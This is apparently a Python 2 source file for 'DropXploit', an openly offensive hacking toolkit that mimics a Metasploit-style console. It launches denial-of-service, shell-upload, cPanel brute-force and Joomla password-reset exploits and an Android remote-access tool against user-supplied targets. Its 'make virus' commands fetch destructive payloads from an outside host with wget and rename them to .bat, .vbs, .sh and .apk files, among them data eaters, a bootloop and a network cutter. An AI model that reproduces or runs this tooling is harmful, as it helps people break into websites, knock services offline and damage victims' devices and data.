#!/usr/bin/env python
# -*- coding: utf-8 -*-
# TOOLS  NAME :  DropXploit
# Coded by Programmer pemalas :'v
# Author : LOoLzeC
# Coded by deray
#kalo mao share atau recode hargain Copyright ya TOLOL! w cape bikin program lo tinggal reshare dan ninggalin jejak anjeng!1!1!1!
import os
import sys
import time
def restart_program():
   python = sys.executable
   os.execl(python, python, * sys.argv)
   curdir = os.getcwd()

if sys.platform == "linux2":
	os.system("clear")
elif sys.platform == "win32":
	os.system("cls")
else:
	os.system("clear")
# Set color
R = '\033[31m' # Red
N = '\033[1;37m' # White
G = '\033[32m' # Green
O = '\033[0;33m' # Orange
B = '\033[1;34m' #Blue
time.sleep(1)
os.system("cd banner;python banner.py")
print ""+N+"          =[ "+O+"DarkSploit v.1 by Deray"+N+"             ]"
print "   + -- --=[ 8 Exploits - 10 Scanners            ]"
print "   + -- --=[ 5 Post - 17 Virus                   ]"
print "   + -- --=[ http://zumizec-com.waper.co/        ]"
print
dr = raw_input(""+N+"DrXp > ")
time.sleep(2)
print " => "+R+"",dr
time.sleep(3)
if dr == "use exploit/power_dos":
	print "set target"
	target = raw_input(""+N+"DrXp > use exploit("+R+"power_dos"+N+"): ")
	print "target =>"+R+"",target
	run = raw_input(""+N+"DrXp > ")
	if run == "run":
		os.system("python modules/hulk_attacks/hulk.py %s" % (target))
		print ""+B+"[*]"+N+" Job finished"
		raw_input("press enter...")
		restart_program()
	else:
		print "[*] wrong input!"
		print "exiting..."
		time.sleep(1)
		print ""+B+"["+R+"*"+B+"]"+N+" Job canceled..."
		time.sleep(1)
		sys.exit()
elif dr == "use exploit/php_thumb_shell_upload":
	print "set target"
	list = raw_input(""+N+"DrXp > ("+R+"php_thumb_shell_upload"+N+"): ")
	time.sleep(1)
	print "target =>"+R+"",list
	go = raw_input(""+N+"DrXp > ")
	if go == "run":
	 	time.sleep(2)
		print ""+B+"[*] "+N+"Starting attacks..."
		os.system("cd modules;cd exploit_phpthumb;perl rcexploit.pl %s" % (list))
		print ""+B+"[*]"+N+" Job finished"
		raw_input("press enter...")
		restart_program()
	else:
		print "[*] Wrong input"
		print "exiting..."
		time.sleep(1)
		print ""+B+"["+R+"*"+B+"]"+N+" Job canceled..."
		time.sleep(1)
		sys.exit()
elif dr == "use exploit/cpanel_bruteforce":
	print "set target"
	vc = raw_input(""+N+"DrXp > ("+R+"cpanel_bruteforce"+N+"): ")
	time.sleep(1)
	print "target => "+R+"",vc
	usr = raw_input(""+N+"SET user > ")
	time.sleep(1)
	print "username = >"+R+"",usr
	port = raw_input(""+N+"SET Lport > ")
	time.sleep(1)
	print "LPORT = > "+R+"",port
	pss = raw_input(""+N+"SET list >")
	time.sleep(1)
	print "list =>"+R+"",pss
	pas = raw_input(""+N+"SET savepass > ")
	time.sleep(1)
	print "save on => "+R+"",pas
	god = raw_input(""+N+"DrXp > ")
	if god == "run":
		time.sleep(2)
		print ""+B+"[*] "+N+"Starting attacks..."
		os.system("cd modules;cd cpanel;perl cpanel.pl %s %s %s %s %s" % (vc,usr,port,pss,pas))
		print ""+B+"[*]"+N+" Job finished"
		raw_input("press enter...")
		restart_program()
	else:
		print "[!] Wrong input!"
		print "exiting..."
		time.sleep(1)
		print ""+B+"["+R+"*"+B+"]"+N+" Job canceled..."
		sys.exit()
elif dr == "use exploit/android_remote_acces":
	print ""+N+" => now u can enter 'show options'"
	os.system("cd modules;cd android;python android.py")
elif dr == "use exploit/joomla_com_hdflayer":
	print "set target"
	t = raw_input(""+N+"DrXp > ("+R+"joomla_com_hdflayer"+N+"): ")
	time.sleep(1)
	print "target => "+R+"",t
	f = raw_input(""+N+"SET shellock > ")
	time.sleep(1)
	print "target => "+R+"",f
	r = raw_input(""+N+"DrXp > ")
	time.sleep(1)
	if r == "run":
		print ""+B+"[*] "+N+"Starting attacks..."
		os.system("cd  modules;cd exploit_joomla;python2 exploitjoomla.py -t %s -f %s" % (t,f))
		print ""+B+"[*]"+N+" Job finished"
		raw_input("press enter...")
		restart_program()
	else:
		print "[!] Wrong input!"
		print "exiting..."
		time.sleep(1)
		print ""+B+"["+R+"*"+B+"]"+N+" Job canceled..."
		sys.exit()
elif dr == "use exploit/wp_symposium_shell_upload":
	print "set target"
	vc = raw_input(""+N+"DrXp > ("+R+"wp_symposium_shell_upload"+N+"): ")
	time.sleep(1)
	print "target => "+R+"",vc
	fl = raw_input("SET shellock > ")
	time.sleep(1)
	print "shell location = > "+R+"",fl
	ru = raw_input("DrXp > ")
	time.sleep(2)
	if ru == "run":
		print ""+B+"[*] "+N+"Starting attacks..."
		os.system("cd modules;cd prestashop;python2 wp-symposium.py -t %s -f %s" % (vc,fl))
		print ""+B+"[*]"+N+" Job finished"
		raw_input("press enter...")
		restart_program()
	else:
		print "[!] Wrong input!"
		time.sleep(1)
		print "exiting..."
		time.sleep(1)
		print ""+B+"["+R+"*"+B+"]"+N+" Job canceled..."
		sys.exit()
elif dr == "use scanners/jdownloads_scanners":
	print "set list"
	li = raw_input(""+N+"DrXp > ("+R+"jdownloads_scanners"+N+"): ")
	time.sleep(1)
	print "list => "+R+"",li
	ruu = raw_input(""+N+"DrXploit > ")
	time.sleep(1)
	if ruu == "run":
		print ""+B+"[*] "+N+"Starting attacks..."
		os.system("cd modules;cd jdownloads_scanner;perljdownloads_scanner.pl %s" % (li))
elif dr == "use exploit/joomla0day_com_myngallery":
	print "=>"+G+" Target for example http://locahost/ 1,2,3"
	ft = raw_input(""+N+"DrXp > ("+R+"joomla0day_com_myngallery"+N+"): ")
	print "target =>"+R+"",ft
	gr = raw_input(""+N+"DrXp > ")
	if gr == "run":
		time.sleep(1)
		print ""+B+"[*] "+N+"Starting attacks..."
		os.system("cd modules;cd jom0;perl 0day.pl %s" % (ft))
		print ""+B+"[*]"+N+" Job finished"
		raw_input("press enter...")
		restart_program()
	else:
		print "[!] Wrong input!"
		time.sleep(1)
		print "exiting..."
		time.sleep(1)
		print ""+B+"["+R+"*"+B+"]"+N+" Job canceled..."
		sys.exit()
elif dr == "use exploit/jm_auto_change_pswd":
	print "set target"
	er = raw_input(""+N+"DrXp > ("+R+"jm_auto_change_pswd"+N+"): ")
	time.sleep(1)
	print "target =>"+R+"",er
	pa = raw_input(""+N+"SET newpass > ")
	time.sleep(1)
	print "new pass => "+R+"",pa
	y = raw_input(""+N+"DrXp > ")
	time.sleep(2)
	if y == "run":
		print ""+B+"[*] "+N+"Starting attacks..."
		os.system("cd modules;cd autoriset_joomla0day;perl joomlariset.pl %s %s" % (er,pa))
		print ""+B+"[*]"+N+" Job finished"
		raw_input("press enter...")
		restart_program()
	else:
		print "[!] Wrong input!"
		time.sleep(1)
		print "exiting..."
		time.sleep(1)
		print ""+B+"["+R+"*"+B+"]"+N+" Job canceled..."
		sys.exit()
elif dr == "use scanners/joomla_vulnerability_scanners":
	k = raw_input(""+N+"DrXp > ("+R+"joomla_vulnerability_scanners"+N+"): ")
	if k == "run":
		time.sleep(2)
		print ""+B+"[*]"+N+" Starting attacks..."
		os.system("cd modules;cd joomscan;perl joomlavulnerability.pl")
		print ""+B+"[*]"+N+" Job finished"
		raw_input("press enter...")
		restart_program()
	else:
		print "[!] Wrong input!"
		time.sleep(1)
		print "exiting..."
		time.sleep(1)
		print ""+B+"["+R+"*"+B+"]"+N+" Job canceled..."
		sys.exit()
elif dr == "use scanners/joomla_scanners_v.2":
	print "set target"
	p = raw_input("DrXp > ("+R+"joomla_scanners_v.2"+N+"): ")
	print "target => "+R+"",p
	o = raw_input("DrXp > ")
	if o == "run":
		os.system("cd modules;cd joomscan_v2;python2 joomlascan2.py %s" % (p))
		print ""+B+"[*]"+N+" Job finished"
		raw_input("press enter...")
		restart_program()
	else:
		print "[!] Wrong input!"
		time.sleep(1)
		print "exiting..."
		time.sleep(1)
		print ""+B+"["+R+"*"+B+"]"+N+" Job canceled..."
		sys.exit()
elif dr == "use scanners/joomla_scanners_v3":
	print "set target"
	x = raw_input("DrXp > ("+R+"joomla_scanners_v3"+N+"): ")
	print "target => "+R+"",x
	i = raw_input("DrXp > ")
	if i == "run":
		time.sleep(2)
		print ""+B+"[*] Starting attacks..."+N+""
		os.system("cd modules;cd joomscan_v3/python2 joomlascanner.py %s" % (x))
		print ""+B+"[*]"+N+" Job finished"
		raw_input("press enter...")
		restart_program()
	else:
		print "[!] Wrong input!"
		time.sleep(1)
		print "exiting..."
		time.sleep(1)
		print ""+B+"["+R+"*"+B+"]"+N+" Job canceled..."
		sys.exit()
elif dr == "use scanners/jomscan_v4":
	print "set target"
	ops = raw_input(""+N+"DrXp > ("+R+"jomscan_v4"+N+"): ")
	print "target => "+R+"",ops
	rup = raw_input(""+N+"DrXp > ")
	if rup == "run":
		print ""+B+"[*]"+N+" Starting Attacks..."
		os.system("cd modules;cd joomscan_v4/scan.py %s" % (ops))
		print ""+B+"[*]"+N+" Job finished"
		raw_input("press enter...")
		restart_program()
	else:
		print "[!] Wrong input!"
		time.sleep(1)
		print "exiting..."
		time.sleep(1)
		print ""+B+"["+R+"*"+B+"]"+N+" Job canceled..."
		sys.exit()
elif dr == "use scanners/joomla_sqli_scanners":
	print "set list target"
	q = raw_input("DrXp > ("+R+"joomla_sqli_scanners"+N+"): ")
	print "list web => "+R+"",q
	m = raw_input(""+N+"DrXp > ")
	if m == "run":
		time.sleep(2)
		print ""+B+"[*] "+N+"Starting attacks..."
		os.system("cd modules;cd joomla_sqli_scanners;python2 joomsql.py %s" % (q))
		print ""+B+"[*]"+N+" Job finished"
		raw_input("press enter...")
		restart_program()
	else:
		print "[!] Wrong input!"
		time.sleep(1)
		print "exiting..."
		time.sleep(1)
		print ""+B+"["+R+"*"+B+"]"+N+" Job canceled..."
		sys.exit()
elif dr == "use scanners/lfi_scanners":
	yu = raw_input(""+N+"DrXp > ")
	time.sleep(2)
	print ""+B+"[*] "+N+"Starting attacks..."
	os.system("cd modules;cd lfi_scanners;perl lfi_scanner.pl")
	print ""+B+"[*]"+N+" Job finished"
	raw_input("press enter...")
	restart_program()
elif dr == "use scanners/port_scanners":
	os.system("python modules/port_scanners/port.py")
	print ""+B+"[*]"+N+"Job finished"
	time.sleep(2)
	raw_input(""+G+"press enter...")
	restart_program()
elif dr == "use scanners/dir_search":
	print ""+R+"=> "+N+"set target"
	ym = raw_input(""+N+"DrXp > "+R+"("+N+"dir_search"+R+")"+N+":"+N+" ")
	print "target => "+R+"",ym
	time.sleep(2)
	print ""+N+"set extensions example "+R+"=> "+N+"php/asp"
	puki = raw_input("DrXp > ")
	dih = raw_input("DrXp > ")
	if dih == "run":
		os.system("cd modules;cd dirsearch;python3 dirsearch.py -u %s -e %s" % (ym,puki))
		print ""+B+"[*]"+N+"Job finished..."
		raw_input(""+G+"press enter...")
		restart_program()
	else:
		print "[!] Wrong input!"
		time.sleep(1)
		print "exiting..."
		time.sleep(1)
		print ""+B+"["+R+"*"+B+"]"+N+" Job canceled..."
		sys.exit()
elif dr == "use scanners/wordpress_user_scan":
	print ""+N+"=> "+R+"set target"
	wop = raw_input(""+N+"DrXp > "+R+"("+N+"wordpress_user_scanners"+R+")"+N+": ")
	print "=> "+R+"enter numbers of users to enumerate."
	enum = raw_input(""+N+"DrXp > ")
	uiop = raw_input("DrXp > ")
	if uiop == "run":
		print ""+B+"[*]"+N+" Starting attacks..."
		os.system("cd modules;cd wscan;python wpscanner.py -s %s -n %s" % (wop,enum))
		print ""+B+"[*]"+N+" Job finished..."
		raw_input(""+G+"press enter...")
		restart_program()
	else:
		print "[!] Wrong input!"
		time.sleep(1)
		print "exiting..."
		time.sleep(1)
		print ""+B+"["+R+"*"+B+"]"+N+" Job canceled..."
		sys.exit()
elif dr == "use scanners/cms_war":
	print ""+N+"=>"+R+" set target"
	tops = raw_input(""+N+"DrXp > "+R+"("+N+"cms_war"+R+")"+N+": ")
	print "=>"+R+"" ,tops
	print ""+N+">"+R+" scan "+N+"[dir,shell,backup,files,admin] ?"
	ray = raw_input(""+N+"DrXp > ")
	gay = raw_input(""+N+"DrXp > ")
	if gay == "run":
		print ""+B+"[*]"+N+" Starting attacks..."
		os.system("cd modules;cd scanner;python2 scanner.py %s -m %s" % (tops,ray))
		print ""+B+"[*]"+N+" Job finished..."
		time.sleep(1)
		raw_input(""+G+"Press enter...")
		restart_program()
	else:
		print "[!] Wrong input!"
		time.sleep(1)
		print "exiting..."
		time.sleep(1)
		print ""+B+"["+R+"*"+B+"]"+N+" Job canceled..."
		sys.exit()
elif dr == "make virus/on_android":
	android = raw_input(""+N+"DrXp > ")
	if android == "run":
		time.sleep(1)
		print ""+B+"[*] "+N+"Downloading virus.."
		time.sleep(1)
		os.system("cd virus;mkdir elite;cd elite;wget http://zumizec-com.waper.co/files/elite.apk")
		print "making directory for virus elite.apk..."
		time.sleep(1)
		print "done..."
		time.sleep(1)
		print "moving virus..."
		time.sleep(1)
		print "done.."
		time.sleep(1)
		print "Now check folder Virus on "+R+"/DropXploit/virus/elite/"+N+""
		time.sleep(1)
		print ""+B+"[*]"+N+"Job finished"
		time.sleep(2)
		raw_input(""+G+"press enter...")
		restart_program()
	else:
		print "[!] Wrong input!"
		time.sleep(1)
		print "exiting..."
		time.sleep(1)
		print ""+B+"["+R+"*"+B+"]"+N+" Job canceled..."
		sys.exit()
elif dr == "make virus/on_windows_cut":
	gl = raw_input(""+N+"DrXp > ")
	if gl == "run":
		print ""+B+"[*]"+N+"Downloading virus..."
		time.sleep(1)
		os.system("cd virus;mkdir cut;cd cut;wget http://zumizec-com.waper.co/files/cut.txt;mv cut.txt cut.bat")
		print "making directory for virs..."
		time.sleep(1)
		print "done"
		time.sleep(1)
		print "Now check folder virus on "+R+"/DarkXploit/virus/cut/"
		raw_input(""+G+"press enter...")
		print ""+B+"[*]"+N+" Job finished..."
		time.sleep(1)
		restart_program()
	else:
		print "[!] Wrong input!"
		time.sleep(1)
		print "exiting..."
		time.sleep(1)
		print ""+B+"["+R+"*"+B+"]"+N+" Job canceled..."
		sys.exit()
elif dr == "make virus/on_windows_alay":
	te = raw_input(""+N+"DrXp > ")
	if te == "run":
		print ""+B+"[*]"+N+" Downloading virus..."
		time.sleep(1)
		os.system("cd virus;mkdir alay;cd alay;wget http://zumizec-com.waper.co/files/alay.txt;mv alay.txt alay.vbs")
		print "done..."
		time.sleep(1)
		print "making directory for alay.."
		time.sleep(1)
		print "done..."
		time.sleep(1)
		print "moving..."
		time.sleep(1)
		print "done..."
		time.sleep(1)
		print "now check folder virus on"+R+" /DarkXploit/virus/alay/"
		time.sleep(1)
		print ""+B+"[*]"+N+"Job finished"
		raw_input(""+G+"press enter")
		restart_program()
	else:
		print "[!] Wrong input!"
		time.sleep(1)
		print "exiting..."
		time.sleep(1)
		print ""+B+"["+R+"*"+B+"]"+N+" Job canceled..."
		sys.exit()
elif dr == "make virus/in_android_boot":
	opi = raw_input(""+N+"DrXp > ")
	if opi == "run":
		time.sleep(1)
		print ""+B+"[*]"+N+" Downloading virus..."
		time.sleep(1)
		os.system("cd virus;mkdir bootlop;cd bootlop;wget http://zumizec-com.waper.co/files/bootloop.txt;mv bootloop.txt bootloop.sh")
		print "moving..."
		time.sleep(1)
		print "done..."
		time.sleep(1)
		print "Now check folder virus on "+R+"/DarkXploit/virus/bootloop/"
		time.sleep(1)
		print (""+B+"[*]"+N+" Job finished..")
		time.sleep(1)
		raw_input(""+G+"press enter...")
		restart_program()
	else:
		print "[!] Wrong input!"
		time.sleep(1)
		print "exiting..."
		time.sleep(1)
		print ""+B+"["+R+"*"+B+"]"+N+" Job canceled..."
		sys.exit()
elif dr == "make virus/on_android_zip":
	gl = raw_input(""+N+"DrXp > ")
	if gl == "run":
		print ""+B+"[*]"+N+" Downloading virus..."
		os.system("cd virus;mkdir zipbomb;cd zipbomb;wget http://zumizec-com.waper.co/files/bom-zip.zip")
		time.sleep(1)
		print "done..."
		time.sleep(1)
		print "Now check folder virus on"+R+" /DarkXploit/virus/zipbomb/"
		print ""+B+"[*]"+N+" Job finished..."
		raw_input(""+G+"press enter...")
		restart_program()
	else:
		print "[!] Wrong input!"
		time.sleep(1)
		print "exiting..."
		time.sleep(1)
		print ""+B+"["+R+"*"+B+"]"+N+" Job canceled..."
		sys.exit()
elif dr == "make virus/on_windows_caps":
	pio = raw_input(""+N+"DrXp > ")
	if pio == "run":
		time.sleep(1)
		print ""+B+"[*]"+N+" Downloading virus..."
		os.system("cd virus;mkdir capslock;cd capslock;wget http://zumizec-com.waper.co/files/capslock.txt;mv capslock.txt capslock.vbs")
		print "done..."
		time.sleep(1)
		print "moving.."
		time.sleep(1)
		print "done..."
		print "Now check folder virus on"+R+" /DarkXploit/virus/capslock/"
		time.sleep(1)
		print ""+B+"[*]"+N+" Job finished..."
		time.sleep(1)
		raw_input(""+G+"press enter...")
		restart_program()
	else:
		print "[!] Wrong input!"
		time.sleep(1)
		print "exiting..."
		time.sleep(1)
		print ""+B+"["+R+"*"+B+"]"+N+" Job canceled..."
		sys.exit()
elif dr == "make virus/on_android_dea":
	dea = raw_input(""+N+"DrXp > ")
	if dea == "run":
		time.sleep(1)
		print ""+B+"[*]"+N+" Downloading virus..."
		os.system("cd virus;mkdir data-eater;cd data-eater;wget http://zumizec-com.waper.co/files/data-eater.txt;mv data-eater.txt data-eater.sh")
		time.sleep(1)
		print "done..."
		time.sleep(1)
		print "moving..."
		time.sleep(1)
		print "done..."
		time.sleep(1)
		print "Now check folder virus on "+R+"/DarkXploit/virus/data-eater/"
		time.sleep(1)
		print ""+B+"[*]"+N+" Job finished"
		time.sleep(1)
		raw_input(""+G+"press enter...")
		restart_program()
	else:
		print "[!] Wrong input!"
		time.sleep(1)
		print "exiting..."
		time.sleep(1)
		print ""+B+"["+R+"*"+B+"]"+N+" Job canceled..."
		sys.exit()
elif dr == "make virus/on_windows_cmd":
	yx = raw_input(""+N+"DrXp > ")
	if yx == "run":
		time.sleep(1)
		print ""+B+"[*]"+N+" Downloading virus..."
		os.system("cd virus;mkdir cmd;cd cmd;wget http://zumizec-com.waper.co/files/cmd.txt;mv cmd.txt cmd.bat")
		print "done..."
		time.sleep(1)
		print "moving..."
		time.sleep(1)
		print "done..."
		time.sleep(1)
		print "Now check folder virus on "+R+"/DropXploit/virus/cmd/"
		time.sleep(1)
		print ""+B+"[*]"+N+" Job finished..."
		time.sleep(1)
		raw_input(""+G+"press enter...")
		restart_program()
	else:
		print "[!] Wrong input!"
		time.sleep(1)
		print "exiting..."
		time.sleep(1)
		print ""+B+"["+R+"*"+B+"]"+N+" Job canceled..."
		sys.exit()
elif dr == "make virus/on_windows_dea":
	dead = raw_input(""+N+"DrXp > ")
	if dead == "run":
		time.sleep(1)
		print ""+B+"[*]"+N+"downloading virus..."
		os.system("cd virus;mkdir windows-data-eater;cd windows-data-eater;wget http://zumizec-com.waper.co/files/reg-eater.txt;mv reg-eater.txt reg-eater.bat")
		print "done..."
		time.sleep(1)
		print "moving..."
		time.sleep(1)
		print "done..."
		time.sleep(1)
		print "Now check folder virus on "+R+"/DarkXploit/virus/windows-data-eater/"
		time.sleep(1)
		print ""+B+"[*]"+N+" Job finished..."
		raw_input(""+G+"press enter...")
		restart_program()
	else:
		print "[!] Wrong input!"
		time.sleep(1)
		print "exiting..."
		time.sleep(1)
		print ""+B+"["+R+"*"+B+"]"+N+" Job canceled..."
		sys.exit()
elif dr == "make virus/on_android_frz":
	rez = raw_input(""+N+"DrXp > ")
	if rez == "run":
		time.sleep(1)
		print ""+B+"[*]"+N+" Downloading virus..."
		os.system("cd virus;mkdir freeze;cd freeze;wget http://zumizec-com.waper.co/files/freeze.apk")
		print "done..."
		time.sleep(1)
		print "moving..."
		time.sleep(1)
		print "done..."
		time.sleep(1)
		print "Now check folder virus on"+R+" /DarkXploit/virus/freeze/"
		time.sleep(1)
		print ""+B+"[*]"+N+" Job finished..."
		raw_input(""+G+"press enter...")
		restart_program()
	else:
		print "[!] Wrong input!"
		time.sleep(1)
		print "exiting..."
		time.sleep(1)
		print ""+B+"["+R+"*"+B+"]"+N+" Job canceled..."
		sys.exit()
elif dr == "make virus/on_windows_ugly":
	ugly = raw_input(""+N+"DrXp > ")
	if ugly == "run":
		time.sleep(1)
		print ""+B+"[*]"+N+" Downloading virus..."
		os.system("cd virus;mkdir ugly;cd ugly;wget http://zumizec-com.waper.co/files/ugly.txt;mv ugly.txt ugly.vbs")
		print "done.."
		time.sleep(1)
		print "moving..."
		time.sleep(1)
		print "done..."
		time.sleep(1)
		print "Now check folder virus on "+R+"/DarkXploit/virus/ugly/"
		time.sleep(1)
		print ""+B+"[*]"+N+" Job finished..."
		raw_input(""+G+"press enter...")
		restart_program()
	else:
		print "[!] Wrong input!"
		time.sleep(1)
		print "exiting..."
		time.sleep(1)
		print ""+B+"["+R+"*"+B+"]"+N+" Job canceled..."
		sys.exit()
elif dr == "make virus/on_windows_dat":
	dats = raw_input(""+N+"DrXp > ")
	if dats == "run":
		time.sleep(1)
		print ""+B+"[*]"+N+" Downloading virus..."
		os.system("cd virus;mkdir windows-dat;cd windows-dat;wget http://zumizec-com.waper.co/files/koce.txt;mv koce.txt koce.bat")
		print "done.."
		time.sleep(1)
		print "moving..."
		time.sleep(1)
		print "done.."
		time.sleep(1)
		print "Now check folder virus on "+R+"/DarkXploit/virus/windows-dat/"
		time.sleep(1)
		print ""+B+"[*]"+N+" Job finished..."
		raw_input(""+G+"press enter...")
		restart_program()
	else:
		print "[!] Wrong input!"
		time.sleep(1)
		print "exiting..."
		time.sleep(1)
		print ""+B+"["+R+"*"+B+"]"+N+" Job canceled..."
		sys.exit()
elif dr == "make virus/on_windows_quiz":
	quiz = raw_input(""+N+"DrXp > ")
	if quiz == "run":
		time.sleep(1)
		print ""+B+"[*]"+N+" Downloading virus..."
		os.system("cd virus;mkdir quiz;cd quiz;wget http://zumizec-com.waper.co/files/kuis.txt;mv kuis.txt quiz.bat")
		print "done..."
		time.sleep(1)
		print "moving..."
		time.sleep(1)
		print "done..."
		time.sleep(1)
		print "Now check folder virus on "+R+" /DarkXploit/virus/quiz/"
		time.sleep(1)
		print ""+B+"[*]"+N+" Job finished..."
		raw_input(""+G+"press enter...")
		restart_program()
	else:
		print "[!] Wrong input!"
		time.sleep(1)
		print "exiting..."
		time.sleep(1)
		print ""+B+"["+R+"*"+B+"]"+N+" Job canceled..."
		sys.exit()
elif dr == "use scanners/usr_pro_wordpress_auto_find":
	print ""+N+"=> "+R+"set dorks"
	os.system("cd modules;cd usr_pro_wordpress_auto_find;python userpro.py")
	print ""+B+"["+R+"*"+B+"]"+N+" Job finished..."
	raw_input(""+G+"press enter...")
	restart_program()
elif dr == "show options":
	print ""+N+""
	print " Global Options"
	print " =============="
	print
	print "  Name                     Description"
	print "----------             ------------------"
	print "show exploits          Look this exploits"
	print "show scanners       Look this scanners tools"
	print "show virus             Look this virus name"
	print "show post                 Updated post"
	print "use exploit/             <exploit name>"
	print "use scanners/           <scanners name>"
	print "make virus/              <virus name>"
	print
	raw_input(""+G+"press enter...")
	restart_program()
elif dr == "show exploits":
	print ""+N+""
	print " EXPLOIT"
	print " ======="
	print
	print "   Exploit name                 Rank       Description"
	print "  --------------               -------     -------------"
	print "php_thumb_shell_upload          good       vulnerability"
	print "cpanel_bruteforce              normal      vulnerability"
	print "joomla_com_hdflayer            manual      vulnerability"
	print "wp_symposium_shell_upload       good       vulnerability"
	print "joomla0day_com_myngallery       good       vulnerability"
	print "jm_auto_change_pswd            normal      vulnerability"
	print "android/remote_acces           expert      Remote Acces Administrator (RAT)"
	print "power_dos                      manual      Denial Of Service"
	raw_input(""+G+"press enter...")
	time.sleep(2)
	restart_program()
elif dr == "show scanners":
	print ""+N+""
	print " SCANNERS"
	print " ========="
	print
	print "       name                     Rank       Description"
	print "  --------------               -------     -------------"
	print "joomla_vulnerability_scanners   high       vulnerability"
	print "joomla_scanners_v.2             good       bug scan"
	print "joomla_scanners_v3             normal      bug scan"
	print "jomscan_v4                      good       bug scan"
	print "joomla_sqli_scanners            high       vulnerability scanners"
	print "lfi_scanners                    good       lfi bug scan"
	print "port_scanners                  manual      port scan"
	print "dir_search                      high       directory webscan"
	print "wordpress_user_scan             good       get wordpress username"
	print "cms_war                         high       FULL SCAN ALL WEBSITES"
	print "usr_pro_wordpress_auto_find     good       find user pro vulnerability"
	print
	print
	raw_input(""+G+"press enter...")
	time.sleep(2)
	restart_program()
elif dr == "show post":
	print
	print "    Name                            Date          Description"
	print ""+N+"----------------               ---------------    ---------- "
	print "wordpress_user_scan            Thu, December 14    scanners"
	print "dir_search                     Thu, December 14    scanners"
	print "cms_war                        Fri, December 15    scanners"
	print "usr_pro_wordpress_auto_find    Sat, December 17    scanners"
	print "android_remote_acces           Sat, December 17    exploits"
	print "----------"
	print
	raw_input(""+G+"press enter...")
	restart_program()
elif dr == "make virus/on_macosx_nthg":
	nthg = raw_input(""+N+"DrXp > ")
	if nthg == "run":
		time.sleep(1)
		print ""+B+"[*]"+N+" Downloading virus..."
		os.system("cd virus;mkdir NOTHING;cd NOTHING;wget http://zumizec-com.waper.co/files/nothing.txt;mv nothing.txt NOTHING.app")
		print "done..."
		time.sleep(1)
		print "moving..."
		time.sleep(1)
		print "done..."
		time.sleep(1)
		print "Now check folder virus on "+R+"/DarkXploit/virus/NOTHING/"
		time.sleep(1)
		print ""+B+"[*]"+N+" Job finished..."
		raw_input(""+G+"press enter...")
		restart_program()
	else:
		print "[!] Wrong input!"
		time.sleep(1)
		print "exiting..."
		time.sleep(1)
		sys.exit()
elif dr == "make virus/on_macosx_trnd":
	trnd = raw_input(""+N+"DrXp > ")
	if trnd == "run":
		time.sleep(1)
		print ""+B+"[*]"+N+" Downloading virus..."
		os.system("cd virus;mkdir TRINOIDS;cd TRINOIDS;wget http://zumizec-com.waper.co/files/trinoids.txt;mv trinoids.txt trinoids.app")
		print "done..."
		time.sleep(1)
		print "done..."
		time.sleep(1)
		print "moving..."
		time.sleep(1)
		print "Now check folder virus on "+R+"/DarkXploit/virus/TRINOIDS/"
		time.sleep(1)
		print ""+B+"[*]"+N+" Job finished..."
		raw_input(""+G+"press enter...")
		restart_program()
	else:
		print "[!] Wrong input!"
		time.sleep(1)
		print "exiting..."
		time.sleep(1)
		sys.exit()
elif dr == "make virus/on_windows_rip":
	rip = raw_input(""+N+"DrXp > ")
	if rip == "run":
		time.sleep(1)
		print ""+B+"[*]"+N+" Downloading virus..."
		os.system("cd virus;mkdir RIP;cd RIP;wget http://zumizec-com.waper.co/files/rip.txt;mv rip.txt RIP.bat")
		print "done..."
		time.sleep(1)
		print "done..."
		time.sleep(1)
		print "moving..."
		time.sleep(1)
		print "done..."
		time.sleep(1)
		print "Now check folder virus on "+R+"/DarkXploit/virus/RIP/"
		time.sleep(1)
		print ""+B+"[*]"+N+"Job finished..."
		raw_input(""+G+"press enter...")
		restart_program()
	else:
		print "[!] Wrong input!"
		time.sleep(1)
		print "exiting..."
		time.sleep(1)
		sys.exit()
elif dr == "show virus":
	print ""+N+""
	print " VIRUS"
	print " ====="
	print
	print "       name                     Rank       Description"
	print "  --------------               -------     -------------"
	print "make virus/on_android           high        Make bootlop"
	print "make virus/on_windows_cut       high        Cut the victim's network"
	print "make virus/on_windows_alay     normal       Make the victim's keyboard so alay"
	print "make virus/on_android_zip      manual       Zipbomb"
	print "make virus/on_android_boot     normal       Make bootlop"
	print "make virus/on_windows_caps      low         Make Caps Lock key keeps on alive"
	print "make virus/on_android_dea      manual       Data eater"
	print "make virus/on_windows_cmd      normal       CMD open"
	print "make virus/on_windows_dea      normal       Data eater"
	print "make virus/on_android_frz      normal       Make freeze"
	print "make virus/on_windows_ugly      low         Have no explanation"
	print "make virus/on_windows_dat       high        Data eater"
	print "make virus/on_windows_quiz     normal       Display a quiz on the victim's"
	print "make virus/on_macosx_nthg      normal       -"
	print "make virus/on_macosx_trnd      normal       TRINOIDS!"
	print "make virus/on_windows_rip       high        DEAD!"
	print
	raw_input(""+G+"press enter...")
	time.sleep(2)
	restart_program()
elif dr == "exit":
	print ""+R+"exiting..."
	time.sleep(1)
	print ""+N+"bye ^^ we are LOoLzeC"
	time.sleep(2)
	sys.exit()
else:
	print ""+R+"["+B+"*"+R+"]"+N+" Keywoard Intrupped!"
	time.sleep(1)
	print "exiting...."
	time.sleep(2)
	sys.exit()
